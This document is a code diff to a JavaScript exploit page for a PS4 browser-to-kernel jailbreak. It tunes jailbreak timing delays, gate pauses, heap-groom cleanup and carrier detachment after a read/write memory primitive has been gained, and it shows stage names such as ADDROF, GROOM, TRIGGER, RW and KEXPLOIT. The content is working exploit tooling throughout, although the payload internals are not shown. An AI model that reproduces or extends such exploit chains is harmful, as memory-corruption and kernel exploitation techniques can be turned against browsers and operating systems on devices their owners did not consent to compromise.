@@ -118,7 +118,7 @@ html, body {
 // ========== SHARED CONFIG ==========
 var Q = new URLSearchParams(location.search);
 
-var REVISION = "genuine-u8-rw-15-1352";
+var REVISION = "genuine-u8-rw-16-1352";
 var headerMsg = "mansoor0x";
 
 var MAX_ATTEMPTS = (function(){
@@ -146,10 +146,15 @@ var MEM_DROP_AFTER_RW = Q.get("mem") === "drop";
 var RUN_KERNEL_STAGE = RUN_JAILBREAK || KERNEL_LAB;
 var FORCE_UCRED_SIG_SCAN = Q.get("ksig") === "1";
 var JB_DELAY_MS = (function(){
-    var def = SIMPLE_JB ? "500" : "7500";
+    var def = SIMPLE_JB ? "1200" : "7500";
     var v = parseInt(Q.get("jbdelay") || def, 10);
     if (!isFinite(v)) v = parseInt(def, 10);
     return Math.max(500, Math.min(30000, v));
+})();
+var JB_GATE_PAUSE_MS = (function(){
+    var v = parseInt(Q.get("jbgate") || "400", 10);
+    if (!isFinite(v)) v = 400;
+    return Math.max(0, Math.min(5000, v));
 })();
 var SURVIVE_MS = (function(){
     var parts = (Q.get("sv") || "100,3500,7000").split(",");
@@ -166,6 +171,7 @@ var STAGES = ["BOOT","SSV","ADDROF","GROOM","TRIGGER","RW","KEXPLOIT","SANDBOX",
 var STAGE_STATUS = {};
 for (var _si = 0; _si < STAGES.length; _si++) STAGE_STATUS[STAGES[_si]] = "pending";
 var LOG_MAX = 400;
+var stageUiMuted = false;
 var uiSeq = 0;
 var headerPrinted = false;
 var headerBorder = "=".repeat(50);
@@ -301,7 +307,7 @@ function addLogLine(status, stage, tag, extra) {
             // keep
         } else if (order[status] >= order[cur]) {
             STAGE_STATUS[stage] = status;
-            renderStages();
+            if (!stageUiMuted) renderStages();
         }
     }
 
@@ -1165,17 +1171,26 @@ function reportComposition() {
         }
 
         function scheduleKernelStage() {
-            if (KERNEL_LAB) setTimeout(runKernelLab, JB_DELAY_MS);
-            else if (!RUN_JAILBREAK) {
-                mark("HALTED-BEFORE-JAILBREAK", "rw-primitive-ready-no-kernel-writes-performed");
-                mark("HALT-NOTE", "append-?jb=1-to-url-to-run-kernel-jailbreak-or-klab=1");
-            } else {
-                mark("JAILBREAK-GATE", "explicitly-enabled-by-url-param");
-                setTimeout(runJailbreak, JB_DELAY_MS);
-            }
+            compactLog(12);
+            setTimeout(function() {
+                try {
+                    if (KERNEL_LAB) {
+                        mark("JAILBREAK-GATE", "klab");
+                        setTimeout(runKernelLab, JB_DELAY_MS);
+                    } else if (!RUN_JAILBREAK) {
+                        mark("HALTED-BEFORE-JAILBREAK", "rw-primitive-ready-no-kernel-writes-performed");
+                        mark("HALT-NOTE", "append-?jb=1-to-url-to-run-kernel-jailbreak-or-klab=1");
+                    } else {
+                        mark("JAILBREAK-GATE", "pause=" + JB_GATE_PAUSE_MS + "-jb-delay=" + JB_DELAY_MS);
+                        setTimeout(runJailbreak, JB_DELAY_MS);
+                    }
+                } catch (e) {
+                    mark("JAILBREAK-GATE", "err=" + (e && e.message));
+                }
+            }, JB_GATE_PAUSE_MS);
         }
 
-        function afterRwPassTrimmed() {
+        function afterRwPassReady() {
             markRootsLive();
             if (!testRun) {
                 testRun = true;
@@ -1186,10 +1201,14 @@ function reportComposition() {
         if (!testRun) {
             if (RUN_KERNEL_STAGE) {
                 releasePostRwGroomOnly();
-                trimCarrierTailBatched(afterRwPassTrimmed);
+                if (SIMPLE_JB) {
+                    setTimeout(afterRwPassReady, 50);
+                } else {
+                    trimCarrierTailBatched(afterRwPassReady);
+                }
             } else {
                 if (MEM_DROP_AFTER_RW) releasePreJailbreakMemory();
-                afterRwPassTrimmed();
+                afterRwPassReady();
             }
         } else {
             markRootsLive();
@@ -1381,8 +1400,14 @@ function trimCarrierTailBatched(done) {
     setTimeout(step, 0);
 }
 
-// Groom/filler only — keeps getterCarrier[0..3], fakeHost, globalFakeArray.
+function detachCarrierAfterRw() {
+    if (!globalFakeArray) return;
+    getterCarrier = null;
+}
+
+// Groom/filler only — control POC keeps carrier; we drop groom heap only (carrier trim OOMs at gate).
 function releasePostRwGroomOnly() {
+    stageUiMuted = true;
     try { history.replaceState(null, ""); } catch (_) {}
     referenceTarget = null;
     preparedSymbolObject = null;
@@ -1395,8 +1420,9 @@ function releasePostRwGroomOnly() {
     for (var i = 0; i < keepAlive.length; i++) keepAlive[i] = null;
     keepIndex = 0;
     dropFillerGraphImmediate();
-    compactLog(28);
-    mark("MEM-TRIM", "groom+filler-out-carrier-tail-batched-next");
+    detachCarrierAfterRw();
+    compactLog(16);
+    mark("MEM-TRIM", "groom+filler-out-carrier-detached=" + (getterCarrier === null));
 }
 
 // Drop SSV/addrof/groom garbage after RW is live (PS4 browser OOMs if one big GC spike).
@@ -1649,9 +1675,9 @@ function runJailbreakSimple(meta) {
 
 // ========== PS4 JAILBREAK ==========
 function runJailbreak() {
+    compactLog(8);
     mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);
     clearSurvivalMarks();
-    compactLog(48);
 
     if (SIMPLE_JB) {
         runJailbreakSimple(null);
